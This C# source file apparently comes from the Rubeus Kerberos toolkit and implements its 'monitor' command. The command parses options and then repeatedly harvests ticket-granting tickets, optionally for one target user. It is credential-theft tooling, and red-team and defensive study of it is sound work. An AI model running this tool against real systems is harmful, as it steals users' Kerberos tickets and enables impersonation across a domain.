﻿using System;
using System.Collections.Generic;


namespace Rubeus.Commands
{
    public class Monitor : ICommand
    {
        public static string CommandName => "monitor";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: TGT Monitoring");

            string targetUser = null;
            int interval = 60;
            string registryBasePath = null;
            bool nowrap = false;

            if (arguments.ContainsKey("/nowrap"))
            {
                nowrap = true;
            }
            if (arguments.ContainsKey("/filteruser"))
            {
                targetUser = arguments["/filteruser"];
            }
            if (arguments.ContainsKey("/targetuser"))
            {
                targetUser = arguments["/targetuser"];
            }
            if (arguments.ContainsKey("/monitorinterval"))
            {
                interval = Int32.Parse(arguments["/monitorinterval"]);
            }
            if (arguments.ContainsKey("/interval"))
            {
                interval = Int32.Parse(arguments["/interval"]);
            }
            if (arguments.ContainsKey("/registry"))
            {
                registryBasePath = arguments["/registry"];
            }

            if(!String.IsNullOrEmpty(targetUser))
            {
                Console.WriteLine("[*] Target user     : {0:x}", targetUser);
            }
            Console.WriteLine("[*] Monitoring every {0} seconds for new TGTs\r\n", interval);

            var harvester = new Harvest(interval, interval, false, targetUser, registryBasePath, nowrap);
            harvester.HarvestTicketGrantingTickets();
        }
    }
}